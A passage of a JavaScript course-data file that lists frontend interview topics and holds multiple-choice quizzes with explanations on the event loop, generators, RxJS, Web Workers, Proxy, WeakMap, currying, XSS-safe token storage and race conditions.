      { id: 'layout-shift', title: 'Preventing Layout Shift (CLS)', desc: 'CLS causes — images without dimensions, dynamic content, fonts — and fixes.', diff: 'medium' },
      { id: 'framer-motion', title: 'React Animation Patterns', desc: 'Framer Motion basics, AnimatePresence for exit animations, layout animations.', diff: 'medium' },
    ],
  },

  'a11y': {
    title: 'Accessibility', color: '#34d399',
    items: [
      { id: 'a11y-semantics', title: 'Semantic HTML & ARIA', desc: 'Landmark roles, ARIA attributes, when to use ARIA vs native HTML.', diff: 'medium' },
      { id: 'a11y-keyboard', title: 'Keyboard Navigation', desc: 'Focus management, tab order, focus trapping in modals, skip links.', diff: 'hard' },
      { id: 'a11y-screen-reader', title: 'Screen Reader Compatibility', desc: 'How screen readers work, live regions, announcements, testing with NVDA/VoiceOver.', diff: 'hard' },
      { id: 'a11y-color', title: 'Color & Contrast', desc: 'WCAG contrast ratios, color blindness, not relying on color alone.', diff: 'easy' },
      { id: 'a11y-forms', title: 'Accessible Forms', desc: 'Labels, error messages, fieldset/legend, autocomplete, required field patterns.', diff: 'medium' },
      { id: 'a11y-images', title: 'Images & Media Accessibility', desc: 'Alt text strategies, decorative images, captions, audio descriptions.', diff: 'easy' },
      { id: 'a11y-testing', title: 'Accessibility Testing', desc: 'axe-core, Lighthouse, manual testing checklist, WCAG 2.1 AA compliance.', diff: 'medium' },
    ],
  },
  'patterns': {
    title: 'Design Patterns', color: '#06b6d4',
    items: [
      { id: 'pattern-singleton', title: 'Singleton Pattern', desc: 'Ensure a class has only one instance and provide a global access point to it.', diff: 'easy' },
      { id: 'pattern-observer', title: 'Observer Pattern', desc: 'Define a subscription mechanism to notify multiple objects about events.', diff: 'medium' },
      { id: 'pattern-factory', title: 'Factory Pattern', desc: 'Create objects without specifying the exact class — delegate instantiation to a factory.', diff: 'medium' },
      { id: 'pattern-strategy', title: 'Strategy Pattern', desc: 'Define a family of algorithms, encapsulate each one, and make them interchangeable.', diff: 'medium' },
      { id: 'pattern-decorator', title: 'Decorator Pattern', desc: 'Attach additional responsibilities to an object dynamically without modifying its class.', diff: 'medium' },
      { id: 'pattern-proxy', title: 'Proxy Pattern', desc: 'Provide a surrogate for another object to control access, add caching, or logging.', diff: 'medium' },
      { id: 'pattern-command', title: 'Command Pattern', desc: 'Encapsulate requests as objects — enables undo/redo, queuing, and logging of operations.', diff: 'hard' },
      { id: 'pattern-facade', title: 'Facade Pattern', desc: 'Provide a simplified interface to a complex subsystem.', diff: 'easy' },
      { id: 'pattern-pubsub', title: 'Pub/Sub vs Observer', desc: 'Event-driven architecture — differences between pub/sub and observer patterns.', diff: 'medium' },
      { id: 'pattern-mvc', title: 'MVC / MVP / MVVM', desc: 'Architectural patterns for separating concerns in UI applications.', diff: 'hard' },
    ],
  },
  'bundlers': {
  title: 'Build Tools & Bundlers', color: '#f59e0b',
  items: [
    { id: 'bundler-webpack',  title: 'Webpack Deep Dive',          desc: 'Entry, output, loaders, plugins, code splitting, and optimization strategies.',           diff: 'hard'   },
    { id: 'bundler-vite',     title: 'Vite & ESBuild',             desc: 'Why Vite is faster than Webpack in development — native ESM, no bundling in dev.',        diff: 'medium' },
    { id: 'bundler-rollup',   title: 'Rollup & Tree Shaking',      desc: 'Library bundling, ES module output, and how tree shaking eliminates dead code.',          diff: 'medium' },
    { id: 'bundler-babel',    title: 'Babel & Transpilation',      desc: 'How Babel transforms modern JS to older syntax — presets, plugins, polyfills.',           diff: 'medium' },
    { id: 'bundler-tsconfig', title: 'TypeScript & tsconfig',      desc: 'Compiler options that matter: strict, target, module, paths, composite projects.',        diff: 'medium' },
    { id: 'bundler-cicd',     title: 'CI/CD for Frontend',         desc: 'Automated testing, building, and deployment pipelines — GitHub Actions, previews.',       diff: 'medium' },
    { id: 'bundler-perf',     title: 'Bundle Analysis & Optimization', desc: 'Analyzing bundle size, eliminating bloat, and measuring real impact.',               diff: 'hard'   },
  ],
},
'system-design-interview': {
  title: 'System Design Round', color: '#06b6d4',
  items: [
    { id: 'sd-frontend-arch',  title: 'Frontend Architecture Patterns',  desc: 'Monolith vs micro-frontends, feature-based folder structure, scaling frontend teams.', diff: 'hard'   },
    { id: 'sd-api-design',     title: 'API Design & Communication',      desc: 'REST vs GraphQL vs tRPC, pagination strategies, versioning, real-time options.',         diff: 'hard'   },
    { id: 'sd-performance',    title: 'Performance at Scale',            desc: 'CDN strategy, caching layers, code splitting, critical path optimization.',              diff: 'hard'   },
    { id: 'sd-state-arch',     title: 'State Architecture at Scale',     desc: 'Choosing state boundaries, server vs client state, normalization, sync strategies.',    diff: 'hard'   },
    { id: 'sd-auth-design',    title: 'Authentication Architecture',     desc: 'JWT vs sessions, OAuth flows, refresh token rotation, secure storage.',                 diff: 'hard'   },
    { id: 'sd-realtime',       title: 'Real-time Systems Design',        desc: 'WebSockets, SSE, polling trade-offs, presence systems, collaborative editing.',         diff: 'hard'   },
    { id: 'sd-design-system',  title: 'Design System Architecture',      desc: 'Token architecture, component API design, versioning, distribution, adoption.',        diff: 'hard'   },
    { id: 'sd-monitoring',     title: 'Observability & Monitoring',      desc: 'Error tracking, performance monitoring, logging, alerting, user session replay.',       diff: 'hard'   },
    { id: 'sd-accessibility',  title: 'Accessibility at Scale',          desc: 'WCAG compliance strategy, automated testing pipeline, component library a11y.',        diff: 'medium' },
    { id: 'sd-interview-tips', title: 'System Design Interview Tips',    desc: 'How to structure answers, what interviewers look for, common mistakes to avoid.',      diff: 'medium' },
  ],
},
};

export const QUIZZES = {
  'event-loop': [
    { q: "What's the output order?\n\nconsole.log('1');\nsetTimeout(() => console.log('2'), 0);\nPromise.resolve().then(() => console.log('3'));\nconsole.log('4');", opts: ['1, 2, 3, 4', '1, 4, 3, 2', '1, 4, 2, 3', '4, 1, 3, 2'], correct: 1, explain: "Sync code runs first (1, 4). Promise callbacks are microtasks — they run BEFORE macrotasks (setTimeout). So: 1 → 4 → 3 → 2." },
    { q: "Which has higher priority in the event loop?", opts: ['setTimeout callback', 'Promise.then callback', 'They run in the same queue', 'Depends on the browser'], correct: 1, explain: "Promise.then goes to the microtask queue, which is fully drained after each task before the macrotask queue (setTimeout) is processed." },
  ],
  'closure-def': [
    { q: "What does this loop print?\n\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}", opts: ['0, 1, 2', '3, 3, 3', '0, 0, 0', 'undefined x3'], correct: 1, explain: "var is function-scoped so all closures share the same i. By setTimeout fires, i = 3. Fix: use let (block-scoped)." },
  ],
  'xss': [
    { q: "Which is MOST vulnerable to stored XSS?", opts: ['element.textContent = userInput', 'element.innerHTML = userInput', 'encodeURIComponent(userInput)', 'JSON.stringify(userInput)'], correct: 1, explain: "innerHTML parses HTML, executing any <script> or onerror handlers. Always use textContent or sanitize with DOMPurify." },
  ],
  'fiber': [
    { q: "What is the main benefit of React Fiber over the legacy stack reconciler?", opts: ['Faster Virtual DOM diffing', 'Ability to pause and resume rendering (interruptible)', 'Smaller bundle size', 'Better class component support'], correct: 1, explain: "React Fiber allows rendering to be split into chunks and paused to let the browser handle higher-priority work — enabling Concurrent Mode, Suspense, and useTransition." },
  ],
  'cwv': [
    { q: "A page's LCP image loads in 500ms but LCP is reported as 4.2s. Most likely cause?", opts: ['Wrong image format', 'Element was below fold', 'Element started as display:none then became visible', 'Too many CSS classes'], correct: 2, explain: "LCP measures when the element becomes visible. If it starts as display:none then renders later, the clock keeps running from page load." },
  ],
  'auth-patterns': [
    { q: "Where should you store a JWT refresh token for best security?", opts: ['localStorage', 'sessionStorage', 'httpOnly cookie', 'In-memory JS variable'], correct: 2, explain: "httpOnly cookies are inaccessible to JavaScript (XSS-safe) and automatically sent with requests. localStorage/sessionStorage are vulnerable to XSS." },
  ],
  'virtual-dom': [
    { q: "When is it MOST important to add a key prop to list items?", opts: ['Always, for React performance', 'When items can be reordered, added, or removed', 'Only for items over 100 in length', 'Only for database items'], correct: 1, explain: "The key prop helps React identify which items changed. Without stable keys during reorders, React may re-render the wrong items or destroy/recreate DOM unnecessarily." },
  ],
  'rendering-patterns': [
    { q: "Which rendering strategy is BEST for a product page that changes hourly?", opts: ['CSR (Client-Side Rendering)', 'SSG (Static Site Generation) with build-time data', 'ISR (Incremental Static Regeneration) with revalidate', 'Always SSR per request'], correct: 2, explain: "ISR (revalidate) pre-renders the page statically but regenerates it in the background when stale. You get the speed of static + freshness without SSR overhead per request." },
  ],
  // Add to QUIZZES object:

  'mc-debounce': [
    {
      q: "You implement debounce with a 300ms delay for a search input. User types 'r', 'e', 'a', 'c', 't' quickly. How many API calls are made?",
      opts: ['5 calls (one per keystroke)', '1 call (after 300ms of silence)', '0 calls', '2 calls'],
      correct: 1,
      explain: "Debounce resets the timer on every keystroke. Only after the user stops typing for 300ms does it fire — resulting in exactly 1 API call."
    }
  ],

  'ji-event-loop': [
    {
      q: "What is the output?\nasync function foo() {\n  console.log('B');\n  await null;\n  console.log('C');\n}\nconsole.log('A');\nfoo();\nconsole.log('D');",
      opts: ['A, B, C, D', 'A, B, D, C', 'B, A, D, C', 'A, D, B, C'],
      correct: 1,
      explain: "A runs sync. foo() starts: B logs sync. await null pauses — rest of foo() becomes a microtask. D runs sync. Then microtask runs: C logs. Output: A, B, D, C."
    }
  ],

  'ri-rerenders': [
    {
      q: "A child component wrapped in React.memo still re-renders on every parent render. Most likely cause?",
      opts: [
        'React.memo is broken',
        'A prop is a new object/function reference created inline each render',
        'The child has internal state',
        'React 18 changed React.memo behavior'
      ],
      correct: 1,
      explain: "React.memo does shallow comparison. If you pass config={{ color: 'red' }} inline, it creates a new object reference each render — shallow comparison sees them as different even though the values are equal."
    }
  ],

  'rf-null-undefined': [
    {
      q: "What does typeof null return?",
      opts: ["'null'", "'undefined'", "'object'", "'boolean'"],
      correct: 2,
      explain: "typeof null === 'object' is a 30-year-old JavaScript bug that was kept for backward compatibility. It should return 'null' but changing it would break too much existing code."
    }
  ],

  'si-jwt': [
    {
      q: "Where should you store a JWT access token for best security in a browser?",
      opts: [
        'localStorage — easy to access',
        'sessionStorage — cleared on tab close',
        'httpOnly cookie — cannot be read by JS',
        'In-memory JS variable'
      ],
      correct: 3,
      explain: "In-memory (JS variable) is actually best for access tokens — XSS can't steal what it can't find in persistent storage. Pair with httpOnly cookie for the refresh token. localStorage and sessionStorage are both vulnerable to XSS."
    }
  ],
  // Add all these to the QUIZZES object in courseData.js

  'generators': [
    { q: "What does a generator function return when called?", opts: ["The first yielded value", "A generator object (iterator)", "undefined", "A Promise"], correct: 1, explain: "Calling a generator function doesn't execute it — it returns a generator object with a next() method. Execution only starts when you call next() for the first time." },
    { q: "What does yield do in a generator?", opts: ["Returns a value and terminates the function", "Pauses execution and returns a value to the caller", "Creates a new generator", "Throws an error"], correct: 1, explain: "yield pauses the generator function, returns the yielded value as {value, done:false}, and waits until next() is called again to resume." },
    { q: "What is the output?\nfunction* gen() { yield 1; yield 2; yield 3; }\nconst g = gen();\nconsole.log(g.next().value);", opts: ["undefined", "1", "{value:1,done:false}", "Generator object"], correct: 1, explain: "g.next() resumes the generator to the first yield and returns {value:1, done:false}. .value gives us 1." },
    { q: "How do you make an object iterable using generators?", opts: ["Add a generator property", "Implement [Symbol.iterator] as a generator function", "Use Object.iterate()", "Return a generator from the constructor"], correct: 1, explain: "[Symbol.iterator] is the well-known symbol for the iteration protocol. Making it a generator function automatically creates the correct iterator interface." },
    { q: "What is yield* used for?", opts: ["Yielding a Promise", "Delegating to another iterable/generator", "Returning from a generator", "Creating infinite sequences"], correct: 1, explain: "yield* delegates to another iterable — it yields each value of the inner iterable one by one. Works with any iterable including arrays, strings, and other generators." },
    { q: "What value does .next(42) pass into a generator?", opts: ["Nothing — arguments to next() are ignored", "Sets the return value of the current yield expression", "Restarts the generator with 42", "Creates an error"], correct: 1, explain: "The argument to next(value) becomes the result of the yield expression inside the generator. This enables two-way communication — the generator can both send and receive values." },
    { q: "When is {done: true} returned from a generator?", opts: ["After each yield", "When the function returns or has no more yields", "After calling next() 10 times", "When yield* is used"], correct: 1, explain: "done:true is returned when the generator function reaches a return statement or falls off the end. After that, all subsequent next() calls return {value:undefined, done:true}." },
    { q: "What's the difference between a regular function and a generator?", opts: ["Generators are async by default", "Generators can pause and resume execution multiple times", "Generators always return arrays", "Generators run in a separate thread"], correct: 1, explain: "The key difference is pauseable execution. Regular functions run to completion. Generators can yield multiple times, pausing and resuming, making them perfect for lazy sequences and cooperative multitasking." },
  ],

  'rxjs-basics': [
    { q: "What is the key difference between a Promise and an Observable?", opts: ["Promises are async, Observables are sync", "Promises emit one value; Observables emit zero to many values over time", "Observables are faster", "Promises can be cancelled"], correct: 1, explain: "A Promise resolves exactly once (or rejects). An Observable is a stream that can emit multiple values over time, or no values, and can be cancelled by unsubscribing." },
    { q: "What does 'lazy' mean for Observables?", opts: ["They run slowly", "They only execute when subscribed to", "They delay values by 1 second", "They only work with async data"], correct: 1, explain: "Observables are lazy — no code runs until you call subscribe(). This is unlike Promises which start executing immediately when created." },
    { q: "What does switchMap do?", opts: ["Switches between sync and async", "Cancels previous inner observable when new value arrives", "Maps values to different types", "Merges all observables"], correct: 1, explain: "switchMap subscribes to a new inner observable for each emission, but cancels/unsubscribes from the previous inner observable. Perfect for search — each new keystroke cancels the previous request." },
    { q: "How do you prevent memory leaks with Observables?", opts: ["They clean up automatically", "Call unsubscribe() when done or use takeUntil", "Use async/await instead", "Call .complete() on the source"], correct: 1, explain: "Unlike Promises, Observables don't automatically clean up. You must unsubscribe when the component/context is destroyed. takeUntil(destroy$) is a common pattern in Angular." },
    { q: "What is a 'cold' Observable?", opts: ["An Observable with no values", "Each subscriber gets its own independent execution", "An Observable that runs in cold storage", "An Observable that delays values"], correct: 1, explain: "A cold Observable creates a new execution for each subscriber. Like a Netflix movie — each viewer starts from the beginning. A hot Observable (like a live stream) shares one execution among all subscribers." },
    { q: "Which RxJS operator would you use for a search-as-you-type feature?", opts: ["map + filter", "debounceTime + switchMap", "mergeMap + delay", "concatMap + retry"], correct: 1, explain: "debounceTime waits for the user to stop typing, then switchMap fires the API call and cancels any previous in-flight request if the user types again before it completes." },
    { q: "What is the difference between mergeMap and switchMap?", opts: ["mergeMap is faster", "mergeMap keeps all inner observables; switchMap cancels previous", "They are identical", "mergeMap only works with Promises"], correct: 1, explain: "mergeMap lets all inner observables run concurrently. switchMap cancels the previous inner observable when a new source value arrives. Use switchMap for search, mergeMap for parallel independent operations." },
  ],

  'web-workers': [
    { q: "What is the main purpose of Web Workers?", opts: ["To make HTTP requests faster", "To run JavaScript off the main thread to prevent UI freezing", "To store data in background", "To handle CSS animations"], correct: 1, explain: "Web Workers run in a separate thread, so heavy computations don't block the main thread's event loop. The UI stays responsive while complex work happens in the background." },
    { q: "Can Web Workers directly access the DOM?", opts: ["Yes, all DOM APIs", "Only read access", "No — they communicate via postMessage only", "Yes with a special flag"], correct: 2, explain: "Web Workers have no access to the DOM, window, or document. They can only communicate with the main thread via postMessage()/onmessage. This isolation is intentional for thread safety." },
    { q: "What is a Transferable Object in Web Workers?", opts: ["A shared object both threads can read", "Data transferred (not copied) to avoid expensive cloning", "A special Worker type", "An object that can postMessage itself"], correct: 1, explain: "Transferable objects (ArrayBuffer, MessagePort, ImageBitmap) are transferred with zero-copy — ownership moves from one thread to the other. The original becomes detached/unusable, but it's much faster than copying large buffers." },
    { q: "What is SharedArrayBuffer?", opts: ["A buffer that auto-syncs between threads", "Memory shared between the main thread and workers (true shared memory)", "A larger version of ArrayBuffer", "An encrypted buffer"], correct: 1, explain: "SharedArrayBuffer allows true shared memory between the main thread and workers. Changes in one thread are immediately visible in the other. Requires Atomics for safe concurrent access and COOP/COEP security headers." },
    { q: "When would you use a Service Worker vs a Dedicated Worker?", opts: ["Service Worker for computation; Dedicated Worker for caching", "Dedicated Worker for computation; Service Worker as a network proxy/PWA features", "They are interchangeable", "Service Worker is faster for computation"], correct: 1, explain: "Dedicated Workers run heavy JS computations off the main thread. Service Workers act as a network proxy — they intercept fetch requests, enable offline support, background sync, and push notifications for PWAs." },
    { q: "How do you create an inline Web Worker without a separate file?", opts: ["Pass function directly to Worker()", "Use Blob + URL.createObjectURL()", "Use import() syntax", "Use Worker.inline()"], correct: 1, explain: "Write the worker code as a string, create a Blob with type 'application/javascript', then create an ObjectURL from it and pass to new Worker(). This avoids needing a separate worker file." },
  ],

  'module-pattern': [
    { q: "What is an IIFE and why was it used?", opts: ["A function that runs twice", "An Immediately Invoked Function Expression — creates private scope to avoid polluting global namespace", "A type of module import", "An infinite loop function"], correct: 1, explain: "IIFE (Immediately Invoked Function Expression) runs immediately after being defined. Before ES modules, it was the primary way to create private scope and avoid polluting the global namespace." },
    { q: "What is the revealing module pattern?", opts: ["Showing all private variables", "Define everything privately, only return/reveal what should be public", "A pattern for revealing animations", "An ES6 feature"], correct: 1, explain: "The revealing module pattern defines all functions/variables privately inside a closure, then explicitly returns an object that only exposes the intended public API." },
    { q: "What is the difference between CommonJS and ES Modules?", opts: ["CJS is newer", "CJS uses require/module.exports (runtime); ESM uses import/export (static, compile-time)", "They are identical", "ESM only works in Node.js"], correct: 1, explain: "CommonJS (require/module.exports) is synchronous and resolved at runtime — good for Node.js. ES Modules (import/export) are static and analyzed at compile time, enabling tree shaking and circular dependency detection." },
    { q: "What enables tree shaking in bundlers?", opts: ["CommonJS require()", "ES Module static import/export syntax", "Dynamic imports", "IIFE pattern"], correct: 1, explain: "Tree shaking requires static analysis of imports/exports. ES modules' static syntax (no conditional imports) lets bundlers know at build time exactly what's used and what can be safely removed." },
    { q: "What does dynamic import() return?", opts: ["The module directly", "A Promise that resolves to the module", "undefined", "A synchronous module object"], correct: 1, explain: "import('./module.js') returns a Promise. This enables code splitting and lazy loading — the module is only downloaded when import() is called, not upfront." },
  ],

  'execution-context': [
    { q: "What is created each time a function is called in JavaScript?", opts: ["A new scope chain", "A new Execution Context", "A new prototype chain", "A new event loop"], correct: 1, explain: "Every function call creates a new Execution Context containing the function's local variables, arguments, this binding, and a reference to the outer scope (for the scope chain)." },
    { q: "What happens during the 'creation phase' of an execution context?", opts: ["Code is executed line by line", "Variables are declared and hoisted before code runs", "The function is defined", "The call stack is cleared"], correct: 1, explain: "In the creation phase, the JS engine scans the code and allocates memory for variables (var → undefined, let/const → TDZ) and function declarations (fully hoisted). This happens BEFORE any code executes." },
    { q: "What is the call stack?", opts: ["A data structure for storing variables", "A LIFO stack tracking which execution context is currently running", "The list of event listeners", "Browser memory allocation"], correct: 1, explain: "The call stack is a LIFO (last in, first out) stack. When a function is called, its execution context is pushed. When it returns, it's popped. 'Maximum call stack size exceeded' happens when it overflows (usually infinite recursion)." },
    { q: "In what order does JavaScript resolve variable lookups?", opts: ["Global → local → outer", "Local → outer scopes → global (scope chain)", "Random order", "Alphabetical by variable name"], correct: 1, explain: "JavaScript walks the scope chain outward — local scope first, then each outer function's scope, finally the global scope. If not found anywhere, it throws ReferenceError." },
    { q: "What is the scope chain?", opts: ["The list of all variables ever created", "The chain of lexical environments from current scope to global", "The prototype chain for functions", "The order of script loading"], correct: 1, explain: "The scope chain connects nested execution contexts. Each context has a reference to its outer context's lexical environment, creating a chain all the way up to the global context." },
  ],

  'deep-clone': [
    { q: "What is the difference between a shallow copy and a deep copy?", opts: ["Shallow is faster, deep is slower", "Shallow copies top-level only; nested objects are still shared references. Deep copy creates independent copies at all levels", "Shallow copies primitives; deep copies objects", "They are the same"], correct: 1, explain: "Shallow copy copies the top level — nested objects remain shared between original and copy. Changes to nested objects affect both. Deep copy recursively copies all levels — fully independent." },
    { q: "What does JSON.parse(JSON.stringify(obj)) NOT handle correctly?", opts: ["Strings and numbers", "Functions, undefined, Date (becomes string), Map/Set (become {}), circular references", "Arrays and objects", "Nested objects"], correct: 1, explain: "JSON.stringify silently drops functions and undefined, converts Date to ISO string, converts Map/Set to empty objects, and throws on circular references. Never use for complex objects." },
    { q: "Which modern method should you use for most deep cloning needs?", opts: ["JSON.parse(JSON.stringify())", "Object.assign()", "structuredClone()", "Spread operator"], correct: 2, explain: "structuredClone() is the modern standard — handles Date, Map, Set, ArrayBuffer, typed arrays, and circular references. Only limitation: cannot clone functions or DOM nodes." },
    { q: "How do you handle circular references in a custom deep clone?", opts: ["Ignore them", "Use a WeakMap to track already-cloned objects and return the clone if seen again", "Throw an error", "Use JSON.stringify with a replacer"], correct: 1, explain: "Track already-visited objects in a WeakMap<original, clone>. Before cloning, check if the object is in the map. If yes, return the existing clone instead of cloning again. This breaks the infinite recursion." },
    { q: "What is the performance implication of deep cloning large objects frequently?", opts: ["No impact", "Deep cloning is O(n) in object size — avoid in hot paths, prefer immutable patterns", "It uses O(1) memory", "Only affects network performance"], correct: 1, explain: "Deep cloning traverses every property recursively — it's O(n) where n is the number of properties. For frequently updated state, immutable update patterns (spread, Immer) are much more efficient than cloning everything." },
  ],

  'proxy-reflect': [
    { q: "What is a Proxy in JavaScript?", opts: ["A network proxy for HTTP requests", "An object that wraps another object and intercepts its fundamental operations", "A design pattern for remote objects", "A type of Promise"], correct: 1, explain: "A Proxy wraps a target object and intercepts operations like property access (get), assignment (set), function calls (apply), in checks (has), etc. via 'traps' defined in a handler object." },
    { q: "Why should you use Reflect inside Proxy traps?", opts: ["It's faster than direct access", "Reflect correctly forwards operations to the target, handles prototype chains properly, and returns the correct boolean", "It provides logging", "It's required"], correct: 1, explain: "Using Reflect.set(target, key, value, receiver) instead of target[key] = value correctly handles prototype chain lookups and setters, and returns a boolean indicating success — matching what the proxy trap should return." },
    { q: "Which JavaScript framework's reactivity system is built on Proxy?", opts: ["React", "Vue 3", "Angular", "Svelte"], correct: 1, explain: "Vue 3's reactivity system (reactive(), ref()) uses Proxy. The get trap tracks which component is reading a property (dependency tracking), and the set trap triggers re-renders when values change." },
    { q: "What is Reflect.ownKeys() useful for?", opts: ["Getting only enumerable keys", "Getting ALL own keys including Symbol keys and non-enumerable", "Deleting all keys", "Checking if a key exists"], correct: 1, explain: "Reflect.ownKeys() returns all own property keys including Symbol keys and non-enumerable properties — unlike Object.keys() which only returns string enumerable keys. Essential for proper deep clone implementations." },
    { q: "Can you Proxy a primitive value like a number or string?", opts: ["Yes, any value", "No — Proxy only works with objects and functions", "Only with Reflect", "Only in strict mode"], correct: 1, explain: "Proxy only works with objects (including functions, arrays, etc.). Primitives are immutable values with no properties to intercept. Attempting to proxy a primitive throws a TypeError." },
  ],

  'weak-refs': [
    { q: "What is the key advantage of WeakMap over Map for caching?", opts: ["WeakMap is faster", "WeakMap keys are weakly held — when the key object is GC'd, the entry is automatically removed (no memory leak)", "WeakMap can store more data", "WeakMap is iterable"], correct: 1, explain: "WeakMap keys are weakly referenced — the GC can collect a key object even if it's in the WeakMap. The entry is automatically removed. This makes WeakMap perfect for caches without manual cleanup." },
    { q: "Why can't you iterate over a WeakMap?", opts: ["It's a bug in the spec", "Iteration is impossible because entries can disappear at any time due to GC", "For security reasons", "WeakMap doesn't support the iterator protocol"], correct: 1, explain: "The GC can remove entries at any time (between any two JS instructions). Making WeakMap iterable would be non-deterministic and cause inconsistent behavior. The inability to iterate is intentional and part of its definition." },
    { q: "What does WeakRef.deref() return if the object has been garbage collected?", opts: ["null", "undefined", "An empty object {}", "Throws ReferenceError"], correct: 1, explain: "WeakRef.deref() returns the referenced object if it's still alive, or undefined if it has been garbage collected. Always check: const obj = ref.deref(); if (obj) { /* use obj */ }" },
    { q: "What is FinalizationRegistry used for?", opts: ["Registering event listeners", "Running cleanup callbacks after an object is garbage collected", "Preventing GC", "Monitoring memory usage"], correct: 1, explain: "FinalizationRegistry lets you register a callback that runs after a target object is GC'd. Useful for cleaning up external resources (file handles, native objects) that can't be tracked via the object itself." },
    { q: "When should you use WeakMap vs Map?", opts: ["Always use WeakMap, it's better", "WeakMap when keys are objects you don't own and want auto-cleanup; Map when you need iteration or primitive keys", "Map for small data, WeakMap for large", "They are interchangeable"], correct: 1, explain: "Use WeakMap when: keys are objects (DOM nodes, class instances), you want automatic cleanup when the key is collected, and you don't need iteration/size. Use Map when: you need to iterate, check size, or use primitive keys." },
  ],

  'currying': [
    { q: "What is currying?", opts: ["Adding spice to functions", "Transforming f(a,b,c) into f(a)(b)(c) — function that returns functions until all args are provided", "Memoizing function results", "Composing two functions"], correct: 1, explain: "Currying transforms a multi-argument function into a sequence of single-argument functions. f(a, b) becomes f(a)(b). Each call takes one argument and returns the next function until all args are collected." },
    { q: "What is partial application?", opts: ["Applying a function to part of an array", "Pre-filling some arguments of a function to create a specialized version", "A type of currying where all args must be provided one at a time", "The same as currying"], correct: 1, explain: "Partial application fixes some (but not necessarily all one at a time) arguments to create a more specific function. multiply(2) from multiply(a,b,c) is partial application — one argument fixed, two remaining." },
    { q: "What is the pipe() function used for?", opts: ["Async data streaming", "Composing functions left-to-right: pipe(f,g,h)(x) = h(g(f(x)))", "Creating generators", "Making HTTP requests"], correct: 1, explain: "pipe() composes functions so data flows left to right. pipe(f, g, h)(x) is equivalent to h(g(f(x))). It makes data transformation pipelines readable: pipe(parse, validate, transform, format)(rawInput)." },
    { q: "What does fn.length represent in JavaScript?", opts: ["The number of times fn has been called", "The number of formal parameters fn expects (its arity)", "The length of fn's name string", "The number of lines in fn"], correct: 1, explain: "Function.length is the arity — the number of parameters in the function definition. Used in auto-curry implementations to know when all arguments have been collected. Note: rest parameters (...args) count as 0." },
    { q: "What is the advantage of currying for function composition?", opts: ["It makes functions faster", "Creates reusable partially-applied functions that work seamlessly in compose/pipe pipelines", "It handles async operations", "It improves type safety"], correct: 1, explain: "Curried functions with a single pending argument work perfectly as transformers in pipe/compose. filter(isActive) and map(getName) are curried functions ready to be composed without needing wrapper arrow functions." },
    { q: "const add = a => b => a + b; What is add(3)?", opts: ["3", "A function waiting for the second argument b", "NaN", "undefined"], correct: 1, explain: "add(3) partially applies 3 as a. It returns b => 3 + b — a new function waiting for b. This is currying: add(3)(4) would give 7. add(3) alone creates an 'add 3 to anything' function." },
  ],

  'symbols': [
    { q: "What is special about Symbol() values?", opts: ["They are strings with unique IDs", "Each Symbol() call creates a completely unique value — no two Symbols are ever equal", "They are numbers", "They are invisible to the GC"], correct: 1, explain: "Symbol() creates a unique primitive value. Symbol('id') === Symbol('id') is false — even with the same description. Descriptions are only for debugging (Symbol.prototype.description)." },
    { q: "What is Symbol.iterator used for?", opts: ["Iterating over Symbol properties", "Defining how an object should be iterated in for...of loops and spread", "Creating unique IDs", "Accessing private properties"], correct: 1, explain: "Symbol.iterator is a well-known symbol that defines the default iteration behavior. Implementing [Symbol.iterator]() makes an object work with for...of, spread (...), Array.from(), and destructuring." },
    { q: "What is the difference between Symbol() and Symbol.for()?", opts: ["They are identical", "Symbol() creates unique local symbol; Symbol.for('key') creates/retrieves from global registry", "Symbol.for() is faster", "Symbol.for() creates a string, not a symbol"], correct: 1, explain: "Symbol() always creates a new unique symbol. Symbol.for('key') checks the global symbol registry — if 'key' exists, returns it; otherwise creates it. Same key string = same symbol across modules." },
    { q: "Are Symbol properties included in JSON.stringify()?", opts: ["Yes, with special encoding", "No — Symbol properties are silently ignored", "Only with the replacer argument", "Yes as strings"], correct: 1, explain: "JSON.stringify() ignores Symbol-keyed properties — they don't appear in the output. This is useful for attaching metadata to objects that shouldn't be serialized (debug info, internal state)." },
    { q: "What does Symbol.toPrimitive control?", opts: ["Converting a Symbol to a string", "How an object converts to a primitive value (number/string/default hint)", "The Symbol description", "Symbol registry lookup"], correct: 1, explain: "Symbol.toPrimitive(hint) is called when JS needs to convert an object to a primitive. The hint is 'number', 'string', or 'default'. Lets you define custom conversion: new Money(42).valueOf() type behaviors." },
  ],

  'race-conditions': [
    { q: "What is a race condition in frontend development?", opts: ["CSS animations competing for GPU", "When async operations complete in unpredictable order, causing incorrect UI state", "Two components rendering simultaneously", "Network requests blocking each other"], correct: 1, explain: "A race condition occurs when the correctness of the program depends on the timing/ordering of async operations. Classic example: two search requests fire, but the older response arrives last and overwrites the newer results." },
    { q: "What is the best solution for preventing stale search results?", opts: ["Add a loading spinner", "Use AbortController to cancel the previous request when a new one starts", "Debounce with 5 seconds", "Disable the search input while loading"], correct: 1, explain: "AbortController.abort() cancels the in-flight fetch request. The cleanup function in useEffect calls abort() whenever the query changes, ensuring only the latest request can update state." },
    { q: "Does checking 'if (isMounted)' fix a race condition?", opts: ["Yes, completely", "No — it only prevents setState on unmounted components, but stale data can still briefly appear", "Yes, but only in React 18", "Only with useEffect"], correct: 1, explain: "isMounted checks prevent 'state update on unmounted component' warnings but don't fix race conditions. If request #2 completes before request #1, request #1 can still overwrite request #2's results before unmount." },
    { q: "React Query solves race conditions automatically. How?", opts: ["By serializing all requests", "It deduplicates requests and only applies the most recent response to the UI", "By blocking concurrent requests", "By using Web Workers"], correct: 1, explain: "React Query tracks request keys and ignores stale responses. If a new query fires before the previous resolves, the previous response is discarded. It also deduplicates identical simultaneous requests." },
    { q: "What request pattern causes race conditions in search?", opts: ["Debouncing", "Fire-and-forget: each keystroke creates a new request with no cancellation mechanism", "Using async/await", "Using POST instead of GET"], correct: 1, explain: "Fire-and-forget async requests without cancellation are the source of search race conditions. Network requests can complete in any order — slow connections can return older results after newer ones." },
  ],

  // REACT TOPICS
  'render-cycle': [
    { q: "In React 18, what is 'automatic batching'?", opts: ["React automatically splits renders into chunks", "Multiple setState calls are grouped into a single re-render, even in async contexts like setTimeout and Promises", "React automatically memoizes all components", "React batches DOM writes"], correct: 1, explain: "React 18 extended batching to ALL contexts — setTimeout, Promises, native events. Previously (React 17), only event handlers were batched. This reduces unnecessary renders in async code." },
